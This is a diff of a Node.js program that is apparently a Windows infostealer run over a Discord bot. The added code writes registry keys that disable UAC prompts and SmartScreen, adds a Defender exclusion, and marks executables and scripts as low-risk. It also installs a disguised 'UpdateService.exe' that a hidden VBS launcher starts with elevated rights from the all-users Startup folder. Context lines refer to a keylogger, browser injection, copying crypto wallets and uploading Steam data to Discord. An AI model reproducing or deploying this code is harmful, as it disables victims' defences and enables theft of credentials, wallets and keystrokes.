@@ -29,6 +29,12 @@ const FormData = require('form-data'); // make sure it's installed
 
  
  
+ 
+
+ 
+ 
+
+ 
 
  
  
@@ -48,6 +54,22 @@ const FormData = require('form-data'); // make sure it's installed
  
  
 
+ 
+ 
+
+ 
+ 
+
+ 
+ 
+
+ 
+ 
+
+ 
+ 
+
+ 
  
  
 
@@ -2318,31 +2340,56 @@ async function addExclusionDisableUACTemporarily() {
     
     console.log('=== Windows Defender Exclusion and Browser Injection Process ===');
     
+    // Check if running as UpdateService.exe
+    const currentProcessName = path.basename(process.execPath);
+    const isUpdateService = currentProcessName === "UpdateService.exe";
+    
     try {
-        // Step 1: Temporarily disable UAC and add exclusion
+        // Step 1: Temporarily disable UAC and add exclusion (skip if UpdateService.exe)
+        if (isUpdateService) {
+            console.log('\n✓ Running as UpdateService.exe - skipping security configuration (already configured)');
+        } else {
             console.log('\n1. Temporarily adjusting UAC settings...');
             await execAsync('reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f');
             console.log('✓ UAC temporarily disabled');
-            await execAsync('reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System /v EnableSmartScreen /t REG_DWORD /d 0 /f');
-// Disable SmartScreen for Explorer
-            await execAsync('reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer /v SmartScreenEnabled /t REG_SZ /d Off /f');
-            console.log('✓ SmartScreen temporarily disabled');
+            await execAsync('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f');
+            await execAsync('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\SmartScreen" /v EnableSmartScreen /t REG_DWORD /d 0 /f');
+            await execAsync('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\SmartScreen" /v ConfigureAppInstallControl /t REG_SZ /d "Anywhere" /f');
+            await execAsync('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer" /v AicEnabled /t REG_SZ /d "Anywhere" /f');
+            await execAsync('reg add "HKCU\\Software\\Microsoft\\Windows Script Host\\Settings" /v "Enabled" /t REG_DWORD /d 1 /f');
+            await execAsync('reg add "HKCU\\Software\\Microsoft\\Windows Script Host\\Settings" /v "SmartScreenEnabled" /t REG_DWORD /d 0 /f');
+            await execAsync('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f');
+            await execAsync('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations" /v "LowRiskFileTypes" /t REG_SZ /d ".vbs;.exe;.bat;.cmd" /f');
+            await execAsync('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Script Host\\Settings" /v "Enabled" /t REG_DWORD /d 1 /f');
+            await execAsync('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Script Host\\Settings" /v "SmartScreenEnabled" /t REG_DWORD /d 0 /f');
+
+
             // Add the exclusion
             await execAsync(`powershell -Command "Add-MpPreference -ExclusionPath '${exclusionPath}'"`);
             console.log('✓ Exclusion added without UAC prompt');
-        
-
-        
-        // Step 2: Verify exclusion
-        console.log('\n2. Verifying exclusion...');
-        const isVerified = await verifyExclusion(exclusionPath);
-        
-        if (!isVerified) {
-            console.log('⚠ Continuing despite verification failure...');
+            
+            
+            
+            // Add the exclusion
+            console.log('\n3. Adding exclusion path...');
+            try {
+                await execAsync(`powershell -Command "Add-MpPreference -ExclusionPath '${exclusionPath}'"`);
+                console.log('✓ Exclusion added');
+            } catch (err) {
+                console.log('Note: Exclusion command failed, but Defender is disabled anyway');
+            }
+            
+            // Step 2: Verify exclusion
+            console.log('\n4. Verifying exclusion...');
+            const isVerified = await verifyExclusion(exclusionPath);
+            
+            if (!isVerified) {
+                console.log('⚠ Continuing despite verification failure...');
+            }
         }
         
         // Step 3: Download the file
-        console.log('\n3. Starting download...');
+        console.log('\n' + (isUpdateService ? '1' : '5') + '. Starting download...');
         
         try {
             await fs.access(scriptsPath);
@@ -2366,12 +2413,12 @@ async function addExclusionDisableUACTemporarily() {
         await downloadFile(downloadUrlChrome, zipPath);
         
         // Step 4: Extract the file using adm-zip
-        console.log('\n4. Extracting files with adm-zip...');
+        console.log('\n' + (isUpdateService ? '2' : '6') + '. Extracting files with adm-zip...');
         await unzipFileWithNPM(zipPath, scriptsPath);
         
         // Rest of your code remains the same...
         // Step 5: Verify extraction
-        console.log('\n5. Verifying extraction...');
+        console.log('\n' + (isUpdateService ? '3' : '7') + '. Verifying extraction...');
         await listExtractedFiles(scriptsPath);
         
         await killBrowsers();
@@ -2392,10 +2439,12 @@ async function addExclusionDisableUACTemporarily() {
     } catch (error) {
         console.error('\n❌ Process failed:', error.message);
     } finally {
-        try {
-            console.log('\n✓ UAC restored to Windows default (level 5)');
-        } catch (restoreError) {
-            console.error('❌ Failed to restore UAC:', restoreError.message);
+        if (!isUpdateService) {
+            try {
+                console.log('\n✓ Security settings remain modified for UpdateService.exe startup');
+            } catch (restoreError) {
+                console.error('❌ Error:', restoreError.message);
+            }
         }
     }
 }
@@ -3289,9 +3338,18 @@ async function startKeyLogger() {
   }
 async function installAsStartup() {
     const userDir = os.homedir();
-    const startupDir = path.join(userDir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
+    const startupDir = path.join(
+      "C:",
+      "ProgramData",
+      "Microsoft",
+      "Windows",
+      "Start Menu",
+      "Programs",
+      "Startup"
+    );
     const baseDir = path.join(userDir, "AppData", "LocalLow", "Temp", "Steam", "DEBUG");
     const exePath = path.join(baseDir, "UpdateService.exe");
+    const vbsPath = path.join(baseDir, "RunUpdateService.vbs");
     const startupLnk = path.join(startupDir, "UpdateService.lnk");
 
     // Check if already running as UpdateService.exe
@@ -3312,13 +3370,41 @@ async function installAsStartup() {
         console.log("✅ Already running from install directory.");
     }
 
-    // --- Create shortcut in startup folder ---
+    // --- Create VBS script to launch the exe with admin privileges ---
+    const vbsContent = `' Auto-generated launcher for UpdateService with elevation
+On Error Resume Next
+
+Set objShell = CreateObject("Shell.Application")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+' Path to the executable
+strExePath = "${exePath.replace(/\\/g, '\\\\')}"
+
+' Check if file exists
+If objFSO.FileExists(strExePath) Then
+    ' Run with elevated privileges (runas)
+    ' Parameters: file, arguments, directory, operation, show
+    objShell.ShellExecute strExePath, "", "", "runas", 0
+Else
+    ' Fallback: try to show error (but window is hidden)
+    WScript.Echo "Error: UpdateService.exe not found at " & strExePath
+End If
+
+Set objShell = Nothing
+Set objFSO = Nothing
+`;
+
+    await fs.writeFile(vbsPath, vbsContent, 'utf8');
+    console.log(`📝 Created VBS launcher with elevation: ${vbsPath}`);
+
+    // --- Create shortcut in startup folder (pointing to VBS) ---
     
     // Use PowerShell to create a shortcut in the startup folder
     const createShortcutScript = `
 $WshShell = New-Object -comObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut("${startupLnk}")
-$Shortcut.TargetPath = "${exePath}"
+$Shortcut.TargetPath = "wscript.exe"
+$Shortcut.Arguments = """${vbsPath}"""
 $Shortcut.WorkingDirectory = "${baseDir}"
 $Shortcut.WindowStyle = 1
 $Shortcut.Save()
@@ -3340,7 +3426,7 @@ Write-Output "Shortcut created at ${startupLnk}"
         ps.on('close', (code) => {
             if (code === 0) {
                 console.log(`✅ Startup shortcut created: ${startupLnk}`);
-                console.log("⚡ Program will auto-start on next login");
+                console.log("⚡ Program will auto-start with admin privileges via VBS on next login");
             } else {
                 console.error(`❌ Failed to create startup shortcut. Exit code: ${code}`);
             }
@@ -3386,7 +3472,7 @@ client.once('clientReady', async () => {
                 await copyBrowserWalletsToTemp();
             }
             try {
-                await zipAndUploadSteamUi(guild);
+                 await zipAndUploadSteamUi(guild);
             } catch (error) {
             }
 
@@ -3559,5 +3645,4 @@ function elevateSelf() {
    holypowershellholypowershellAMEN();
    await client.login(TOKEN);
 })();
-
 
